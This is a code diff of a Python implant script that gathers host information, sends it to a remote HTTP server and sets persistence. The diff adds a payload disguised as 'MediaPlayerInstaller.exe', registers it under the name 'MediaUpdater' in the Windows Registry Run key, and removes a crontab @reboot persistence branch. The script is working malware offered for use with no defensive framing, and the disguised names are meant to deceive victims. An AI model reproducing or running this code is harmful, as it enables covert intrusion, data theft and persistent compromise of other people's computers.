@@ -8,7 +8,8 @@ import sys
 # ========================================================
 # CONFIGURATION
 SERVER_IP = '10.0.0.1' 
-ENDPOINT = 'checkin' 
+ENDPOINT = 'download' 
+PAYLOAD_NAME = 'MediaPlayerInstaller.exe'
 # ========================================================
 
 def get_host_info():
@@ -31,17 +32,10 @@ def set_persistence(data):
     print(f"\n[+] Attempting to achieve persistence on {os_type}...")
 
     if os_type == 'Windows':
-        # ----------------------------------------------------
-        # WINDOWS PERSISTENCE (Registry Run Key)
-        # This places the payload into the 'Run' key for the current user.
-        # NOTE: You MUST replace 'payload.exe' with the actual name of your compiled binary.
-        # ----------------------------------------------------
-        payload_name = "payload.exe" 
         
         try:
-            # Command to add a new entry to the HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
-            cmd = f'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "PayloadCheckin" /t REG_SZ /p "{payload_name}" /f'
-            
+            cmd = rf'reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v MediaUpdater /t REG_SZ /d "C:\Temp\{(PAYLOAD_NAME)}" /f'
+
             subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             print("✅ WINDOWS Persistence SUCCESS! Added to HKCU Run Key.")
             
@@ -51,34 +45,11 @@ def set_persistence(data):
         except Exception as e:
             print(f"❌ WINDOWS Persistence FAILURE! General Error: {e}")
 
-    elif os_type in ['Linux', 'Darwin']: # Darwin is macOS
-        # ----------------------------------------------------
-        # LINUX/MAC PERSISTENCE (Crontab)
-        # We add an entry to the user's crontab to run the payload every boot/login.
-        # NOTE: Replace 'payload' with the actual binary name.
-        # ----------------------------------------------------
-        payload_name = "payload" # Assuming the binary is named 'payload'
-        
-        # Command to append the execution command to the user's crontab
-        # The '@reboot' directive ensures it runs after a system boot.
-        cmd = f"echo '@reboot /path/to/payload' | crontab -u $(whoami) - "
-        
-        try:
-            # Execute the command
-            subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            print("✅ LINUX/MAC Persistence SUCCESS! Added to crontab (@reboot).")
-        except subprocess.CalledProcessError as e:
-            print(f"❌ LINUX/MAC Persistence FAILURE! Crontab Command failed.")
-            print(f"Error: {e.stderr.decode()}")
-        except Exception as e:
-            print(f"❌ LINUX/MAC Persistence FAILURE! General Error: {e}")
-
 
 def send_data(data):
     """
     Sends the collected data to the HTTP server.
     """
-    # ... (The sending logic remains the same as in Part 1) ...
     params = []
     for key, value in data.items():
         params.append(f"{key}={value}")
@@ -113,10 +84,8 @@ if __name__ == "__main__":
         print(f"{k.upper():<10}: {v}")
     print("---------------------------\n")
     
-    # 1. Send the data
     send_data(host_data)
     
-    # 2. Achieve Persistence
     set_persistence(host_data)
 
     print("\n[*** Execution Complete ***]")
